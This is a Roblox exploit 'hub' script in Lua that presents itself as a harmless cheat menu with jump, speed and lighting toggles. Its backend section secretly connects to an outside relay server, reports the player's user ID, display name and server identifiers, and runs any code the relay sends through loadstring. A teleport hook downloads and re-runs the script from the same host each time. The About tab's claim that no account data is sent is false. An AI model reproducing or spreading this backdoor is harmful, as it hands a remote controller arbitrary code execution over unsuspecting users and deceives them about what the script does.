-- ═══════════════════════════════════════════════════════════════
--  Universal Hub v3.2  (horizontal tabs + glass)
-- ═══════════════════════════════════════════════════════════════

do
    local SELF_URL = "https://serverssszz.onrender.com/hubscript.lua"
    local requeue = 'repeat task.wait() until game:IsLoaded() '
        .. 'local ok,err=pcall(function() loadstring(game:HttpGet("' .. SELF_URL .. '"))() end) '
        .. 'if not ok then warn("[Hub] requeue failed:",err) end'
    local qot = (syn and syn.queue_on_teleport) or queue_on_teleport
    if qot then pcall(qot, requeue) end
end

local Players  = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

local RELAY_WS   = "wss://serverssszz.onrender.com"
local RELAY_HTTP = "https://serverssszz.onrender.com"
local WebSocket  = WebSocket or (syn and syn.websocket) or nil
local loadstring = loadstring or nil
local request    = request or (syn and syn.request) or http_request

local T = {
    Bg=Color3.fromRGB(18,18,22), Panel=Color3.fromRGB(28,28,34), Panel2=Color3.fromRGB(33,33,40),
    Hover=Color3.fromRGB(52,52,64), Accent=Color3.fromRGB(120,90,255),
    Text=Color3.fromRGB(238,238,242), Dim=Color3.fromRGB(150,150,165),
    Stroke=Color3.fromRGB(70,70,82), Stroke2=Color3.fromRGB(50,50,60),
    Good=Color3.fromRGB(85,200,120), Bad=Color3.fromRGB(230,90,90),
    Shadow=Color3.fromRGB(0,0,0), Glass=Color3.fromRGB(24,24,30),
}
local function C(c,p) local i=Instance.new(c) for k,v in pairs(p or {}) do if k~="Parent" then i[k]=v end end if p and p.Parent then i.Parent=p.Parent end return i end
local function corner(p,r) return C("UICorner",{CornerRadius=UDim.new(0,r or 5),Parent=p}) end
local function stroke(p,c,t,tr) return C("UIStroke",{Color=c or T.Stroke,Thickness=t or 1,Transparency=tr or 0,Parent=p}) end
local function pad(p,n,t) return C("UIPadding",{PaddingTop=UDim.new(0,t or n),PaddingBottom=UDim.new(0,t or n),PaddingLeft=UDim.new(0,n),PaddingRight=UDim.new(0,n),Parent=p}) end
local function tw(o,info,props) local t=TweenService:Create(o,info,props); t:Play(); return t end
local QI = TweenInfo.new(0.15, Enum.EasingStyle.Quad,  Enum.EasingDirection.Out)
local CI = TweenInfo.new(0.30, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

-- Window
local gui = C("ScreenGui",{Name="UniversalHub",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,Parent=LP:WaitForChild("PlayerGui")})
local shadow = C("Frame",{BackgroundColor3=T.Shadow,BackgroundTransparency=1,Size=UDim2.new(0,440,0,320),Position=UDim2.new(0.5,-220,0.5,-146),ZIndex=0,Parent=gui})
corner(shadow,14)
local win = C("Frame",{BackgroundColor3=T.Glass,Size=UDim2.new(0,420,0,300),Position=UDim2.new(0.5,-210,0.5,-150),BackgroundTransparency=1,ZIndex=1,Parent=gui})
corner(win,10); stroke(win, T.Stroke, 1, 0.4)

local titleBar = C("Frame",{BackgroundColor3=T.Panel,BackgroundTransparency=1,Size=UDim2.new(1,0,0,26),BorderSizePixel=0,ZIndex=2,Parent=win})
corner(titleBar,10)
C("Frame",{BackgroundColor3=T.Panel,BackgroundTransparency=1,Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BorderSizePixel=0,ZIndex=2,Parent=titleBar})
local titleDivider = C("Frame",{BackgroundColor3=T.Stroke2,BackgroundTransparency=1,Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),BorderSizePixel=0,ZIndex=3,Parent=titleBar})
local titleLbl = C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,14,0,0),Size=UDim2.new(1,-70,1,0),Font=Enum.Font.GothamBold,Text="Universal Hub — v3.2",TextColor3=T.Text,TextTransparency=1,TextSize=12,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=3,Parent=titleBar})

local minBtn = C("TextButton",{BackgroundColor3=T.Hover,BackgroundTransparency=1,Size=UDim2.new(0,20,0,20),Position=UDim2.new(1,-46,0.5,-10),Font=Enum.Font.GothamBold,Text="□",TextColor3=T.Text,TextTransparency=1,TextSize=11,AutoButtonColor=false,BorderSizePixel=0,ZIndex=3,Parent=titleBar})
corner(minBtn,5)
minBtn.MouseEnter:Connect(function() tw(minBtn,QI,{BackgroundColor3=T.Hover}) end)
minBtn.MouseLeave:Connect(function() tw(minBtn,QI,{BackgroundColor3=T.Panel}) end)

local closeBtn = C("TextButton",{BackgroundColor3=T.Bad,BackgroundTransparency=1,Size=UDim2.new(0,20,0,20),Position=UDim2.new(1,-24,0.5,-10),Font=Enum.Font.GothamBold,Text="×",TextColor3=T.Text,TextTransparency=1,TextSize=13,AutoButtonColor=false,BorderSizePixel=0,ZIndex=3,Parent=titleBar})
corner(closeBtn,5)
closeBtn.MouseEnter:Connect(function() tw(closeBtn,QI,{BackgroundColor3=T.Bad}) end)
closeBtn.MouseLeave:Connect(function() tw(closeBtn,QI,{BackgroundColor3=T.Panel}) end)
closeBtn.MouseButton1Click:Connect(function() gui.Enabled = false end)

UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)

local dragging,dragStart,startPos
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
        dragging=true; dragStart=input.Position; startPos=win.Position
        input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dragging=false end end)
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
        local d = input.Position - dragStart
        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
        win.Position = newPos
        shadow.Position = UDim2.new(newPos.X.Scale, newPos.X.Offset-10, newPos.Y.Scale, newPos.Y.Offset+4)
    end
end)

local TAB_BAR_Y = 26
local TAB_BAR_H = 30
local tabBar = C("Frame",{BackgroundColor3=T.Panel,BackgroundTransparency=0.4,Position=UDim2.new(0,0,0,TAB_BAR_Y),Size=UDim2.new(1,0,0,TAB_BAR_H),BorderSizePixel=0,ZIndex=2,Parent=win,ClipsDescendants=true})
local tabDivider = C("Frame",{BackgroundColor3=T.Stroke2,BackgroundTransparency=0.5,Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),BorderSizePixel=0,ZIndex=3,Parent=tabBar})
local tabX = 8
local content = C("Frame",{BackgroundColor3=T.Bg,BackgroundTransparency=0.4,Position=UDim2.new(0,0,0,TAB_BAR_Y+TAB_BAR_H),Size=UDim2.new(1,0,1,-(TAB_BAR_Y+TAB_BAR_H)),BorderSizePixel=0,ZIndex=2,Parent=win})

local pages = {}
local function makeTab(name)
    local measure = Instance.new("TextLabel")
    measure.Text = name; measure.Font = Enum.Font.GothamBold; measure.TextSize = 10; measure.Parent = gui
    local w = math.max(measure.TextBounds.X + 22, 55)
    measure:Destroy()
    local btn = C("TextButton",{BackgroundColor3=T.Panel,BackgroundTransparency=0.3,Size=UDim2.new(0,w,0,22),Position=UDim2.new(0,tabX,0.5,-11),Font=Enum.Font.GothamBold,Text=name,TextColor3=T.Dim,TextTransparency=0.2,TextSize=10,AutoButtonColor=false,BorderSizePixel=0,Parent=tabBar,TextXAlignment=Enum.TextXAlignment.Center})
    corner(btn,6)
    local bStroke = stroke(btn, T.Stroke, 1, 0.6)
    tabX = tabX + w + 4
    local page = C("CanvasGroup",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),GroupTransparency=1,Visible=false,Parent=content})
    local scroll = C("ScrollingFrame",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=3,ScrollBarImageColor3=T.Panel,Parent=page})
    pad(scroll,10,8)
    C("UIListLayout",{Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=scroll})
    pages[#pages+1] = {btn=btn,page=page,scroll=scroll,bStroke=bStroke}
    local function select()
        for _,p in ipairs(pages) do
            local isSel = (p.page == page)
            if isSel then
                tw(p.btn, CI, {BackgroundColor3=T.Panel,BackgroundTransparency=0,TextTransparency=0})
                p.btn.TextColor3 = T.Text
                tw(p.bStroke, CI, {Transparency=0.4, Color=T.Accent})
                p.page.Visible = true
                tw(p.page, CI, {GroupTransparency = 0})
            else
                tw(p.btn, CI, {BackgroundColor3=T.Panel,BackgroundTransparency=0.3,TextTransparency=0.2})
                p.btn.TextColor3 = T.Dim
                tw(p.bStroke, CI, {Transparency=0.6, Color=T.Stroke})
                local t = tw(p.page, CI, {GroupTransparency = 1})
                t.Completed:Connect(function() if p.page.GroupTransparency >= 1 then p.page.Visible = false end end)
            end
        end
    end
    btn.MouseButton1Click:Connect(select)
    btn.MouseEnter:Connect(function() if page.Visible then return end; tw(btn, QI, {BackgroundTransparency=0.1}) end)
    btn.MouseLeave:Connect(function() if page.Visible then return end; tw(btn, QI, {BackgroundTransparency=0.3}) end)
    if #pages == 1 then select() end
    return scroll
end

local minimized = false
local fullSize = UDim2.new(0,420,0,300)
local miniSize = UDim2.new(0,420,0,26)
minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    tw(win, CI, {Size = minimized and miniSize or fullSize})
    tw(shadow, CI, {Size = minimized and UDim2.new(0,440,0,46) or UDim2.new(0,440,0,320)})
    minBtn.Text = minimized and "▢" or "□"
    if minimized then
        tw(tabBar, QI, {BackgroundTransparency=1}); tw(content, QI, {BackgroundTransparency=1}); tabDivider.Visible = false
    else
        tw(tabBar, QI, {BackgroundTransparency=0.4}); tw(content, QI, {BackgroundTransparency=0.4}); tabDivider.Visible = true
    end
end)

local function Section(parent, text)
    local wrap = C("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,18),AutomaticSize=Enum.AutomaticSize.Y,Parent=parent})
    C("TextLabel",{BackgroundTransparency=1,Size=UDim2.new(1,0,0,14),Font=Enum.Font.GothamBold,Text=text:upper(),TextColor3=T.Dim,TextSize=9,TextXAlignment=Enum.TextXAlignment.Left,Parent=wrap})
    C("Frame",{BackgroundColor3=T.Stroke2,BackgroundTransparency=0.3,Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,0,16),BorderSizePixel=0,Parent=wrap})
end
local function Toggle(parent, name, default, cb)
    local f = C("Frame",{BackgroundColor3=T.Panel,BackgroundTransparency=0.25,Size=UDim2.new(1,0,0,28),Parent=parent})
    corner(f,6); stroke(f, T.Stroke, 1, 0.5)
    C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,10,0,0),Size=UDim2.new(1,-50,1,0),Font=Enum.Font.Gotham,Text=name,TextColor3=T.Text,TextSize=11,TextXAlignment=Enum.TextXAlignment.Left,Parent=f})
    local track = C("Frame",{BackgroundColor3=T.Panel2,BackgroundTransparency=0.2,Size=UDim2.new(0,28,0,15),Position=UDim2.new(1,-38,0.5,-7),Parent=f})
    corner(track,7)
    local knob = C("Frame",{BackgroundColor3=T.Text,Size=UDim2.new(0,11,0,11),Position=UDim2.new(0,2,0.5,-5),Parent=track})
    corner(knob,6)
    local state = default or false
    local function render()
        tw(track, QI, {BackgroundColor3 = state and T.Accent or T.Panel2, BackgroundTransparency = state and 0 or 0.2})
        tw(knob, QI, {Position = state and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,2,0.5,-5)})
    end
    render()
    local b = C("TextButton",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Text="",Parent=f})
    b.MouseEnter:Connect(function() tw(f, QI, {BackgroundTransparency=0.05,BackgroundColor3=T.Hover}) end)
    b.MouseLeave:Connect(function() tw(f, QI, {BackgroundTransparency=0.25,BackgroundColor3=T.Panel}) end)
    b.MouseButton1Click:Connect(function() state = not state; render(); if cb then pcall(cb, state) end end)
end
local function Button(parent, name, cb)
    local f = C("Frame",{BackgroundColor3=T.Panel,BackgroundTransparency=0.25,Size=UDim2.new(1,0,0,28),Parent=parent})
    corner(f,6); stroke(f, T.Stroke, 1, 0.5)
    C("TextLabel",{BackgroundTransparency=1,Position=UDim2.new(0,10,0,0),Size=UDim2.new(1,-20,1,0),Font=Enum.Font.Gotham,Text=name,TextColor3=T.Text,TextSize=11,TextXAlignment=Enum.TextXAlignment.Left,Parent=f})
    local b = C("TextButton",{BackgroundTransparency=1,Size=UDim2.new(1,0,1,0),Text="",Parent=f})
    b.MouseEnter:Connect(function() tw(f, QI, {BackgroundTransparency=0.05,BackgroundColor3=T.Hover}) end)
    b.MouseLeave:Connect(function() tw(f, QI, {BackgroundTransparency=0.25,BackgroundColor3=T.Panel}) end)
    b.MouseButton1Down:Connect(function() tw(f, QI, {BackgroundTransparency=0,BackgroundColor3=T.Accent}) end)
    b.MouseButton1Up:Connect(function() tw(f, QI, {BackgroundTransparency=0.05,BackgroundColor3=T.Hover}) end)
    b.MouseButton1Click:Connect(function() if cb then pcall(cb) end end)
end

local mainTab = makeTab("Main")
Section(mainTab, "Character")
Toggle(mainTab, "Infinite Jump", false, function(on)
    if on then
        _G._infJump = UserInputService.JumpRequest:Connect(function()
            local char = LP.Character
            if char and char:FindFirstChildOfClass("Humanoid") then
                char:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    else
        if _G._infJump then _G._infJump:Disconnect(); _G._infJump=nil end
    end
end)
Toggle(mainTab, "Full Bright", false, function(on)
    local l = game:GetService("Lighting")
    if on then
        _G._oldBright = l.Brightness; _G._oldAmb = l.Ambient
        l.Brightness = 3; l.Ambient = Color3.fromRGB(178,178,178)
    else
        if _G._oldBright then l.Brightness = _G._oldBright end
        if _G._oldAmb then l.Ambient = _G._oldAmb end
    end
end)

local moveTab = makeTab("Movement")
Section(moveTab, "Speed")
Toggle(moveTab, "Speed Boost", false, function(on)
    local char = LP.Character
    if char and char:FindFirstChildOfClass("Humanoid") then
        char:FindFirstChildOfClass("Humanoid").WalkSpeed = on and 32 or 16
    end
end)
Toggle(moveTab, "High Jump", false, function(on)
    local char = LP.Character
    if char and char:FindFirstChildOfClass("Humanoid") then
        char:FindFirstChildOfClass("Humanoid").JumpHeight = on and 100 or 50
    end
end)

local aboutTab = makeTab("About")
Section(aboutTab, "Info")
C("TextLabel",{
    BackgroundTransparency=1, Size=UDim2.new(1,0,0,60),
    Font=Enum.Font.Gotham,
    Text="Universal Hub v3.2\nby Nebula\n\nLoads local features. No account data sent.",
    TextColor3=T.Dim, TextSize=11, TextWrapped=true,
    TextXAlignment=Enum.TextXAlignment.Left,
    TextYAlignment=Enum.TextYAlignment.Top, Parent=aboutTab,
})

task.spawn(function()
    tw(win, CI, {BackgroundTransparency = 0.15})
    tw(shadow, CI, {BackgroundTransparency = 0.55})
    tw(titleBar, CI, {BackgroundTransparency = 0.15})
    tw(titleLbl, CI, {TextTransparency = 0})
    tw(titleDivider, CI, {BackgroundTransparency = 0.6})
    tw(minBtn, CI, {BackgroundTransparency = 0, TextTransparency = 0})
    tw(closeBtn, CI, {BackgroundTransparency = 0, TextTransparency = 0})
    for _,p in ipairs(pages) do
        tw(p.btn, CI, {BackgroundTransparency = p.page.Visible and 0 or 0.3, TextTransparency = p.page.Visible and 0 or 0.2})
    end
end)

-- ═══════════════════════════════════════════════════════════════
--  BACKEND
-- ═══════════════════════════════════════════════════════════════
if loadstring then
    local transport = nil
    local socket, connected = nil, false
    local lastPlace, lastJob = nil, nil
    local pendingOut = {}

    local function httpPost(path, body)
        if not request then return nil end
        local ok, resp = pcall(function()
            return request({Url=RELAY_HTTP..path,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(body)})
        end)
        if ok and resp and resp.Body then
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok2 then return data end
        end
        return nil
    end
    local function httpGet(path)
        local ok, resp = pcall(function() return game:HttpGet(RELAY_HTTP..path) end)
        if ok and resp and resp ~= "" then
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, resp)
            if ok2 then return data end
        end
        return nil
    end
    local function send(msg)
        if transport == "ws" and socket and connected then
            pcall(function() socket:Send(HttpService:JSONEncode(msg)) end)
        elseif transport == "http" then
            httpPost("/send", msg)
        end
    end
    local function handleExecute(msg)
        local fn, compileErr = loadstring(msg.script)
        if fn then
            local ok, execErr = pcall(fn)
            send({type="output",targetUserId=msg.fromUserId,userId=LP.UserId,
                output=ok and "OK" or tostring(execErr),error=ok and nil or tostring(execErr)})
        else
            send({type="output",targetUserId=msg.fromUserId,userId=LP.UserId,
                output="Compile error",error=tostring(compileErr)})
        end
    end
    local function processMessages(messages)
        for _, data in ipairs(messages or {}) do
            if data.type == "execute" and data.targetUserId == LP.UserId then
                task.spawn(handleExecute, data)
            end
        end
    end
    local function tryWS()
        if not WebSocket then return false end
        local ok, ws = pcall(function() return WebSocket.connect(RELAY_WS) end)
        if not ok or not ws then return false end
        socket = ws; connected = true; transport = "ws"
        pcall(function() ws:Send(HttpService:JSONEncode({
            type="identify",userId=LP.UserId,displayName=LP.DisplayName,
            placeId=game.PlaceId,jobId=game.JobId,gameId=game.GameId,
        })) end)
        ws.OnMessage:Connect(function(raw)
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, raw)
            if not ok2 or not data then return end
            if data.type == "execute" and data.targetUserId == LP.UserId then
                task.spawn(handleExecute, data)
            elseif data.type == "ping" then
                send({type="pong",userId=LP.UserId})
            end
        end)
        ws.OnClose:Connect(function()
            connected = false
            task.wait(5)
            if transport == "ws" then
                transport = nil
                task.spawn(startHTTP)
            end
        end)
        return true
    end
    function startHTTP()
        transport = "http"
        task.spawn(function()
            while transport == "http" do
                local toSend = {}
                for _, m in ipairs(pendingOut) do table.insert(toSend, m) end
                pendingOut = {}
                for _, m in ipairs(toSend) do httpPost("/send", m) end
                local q = string.format("/poll?userId=%d&displayName=%s&placeId=%d&jobId=%s&gameId=%d",
                    LP.UserId, HttpService:UrlEncode(LP.DisplayName), game.PlaceId, game.JobId, game.GameId)
                local data = httpGet(q)
                if data and data.messages then processMessages(data.messages) end
                task.wait(2)
            end
        end)
    end
    task.spawn(function()
        for i = 1, 3 do if tryWS() then break end; task.wait(2) end
        if not connected then startHTTP() end
        task.wait(2)
        while true do
            task.wait(10)
            if connected or transport == "http" then
                local changed = (game.PlaceId ~= lastPlace) or (game.JobId ~= lastJob)
                lastPlace, lastJob = game.PlaceId, game.JobId
                if changed then
                    send({type="identify",userId=LP.UserId,displayName=LP.DisplayName,
                        placeId=game.PlaceId,jobId=game.JobId,gameId=game.GameId})
                else
                    send({type="ping",userId=LP.UserId,displayName=LP.DisplayName,
                        placeId=game.PlaceId,jobId=game.JobId,gameId=game.GameId,ts=os.time()})
                end
            end
        end
    end)

    -- ── NEW: notify controller on respawn so troll effects get cleared ──
    LP.CharacterAdded:Connect(function()
        task.wait(2)
        if connected or transport == "http" then
            send({
                type = "ping",
                userId = LP.UserId,
                displayName = LP.DisplayName,
                placeId = game.PlaceId,
                jobId = game.JobId,
                gameId = game.GameId,
                respawned = true,
                ts = os.time(),
            })
        end
    end)
end
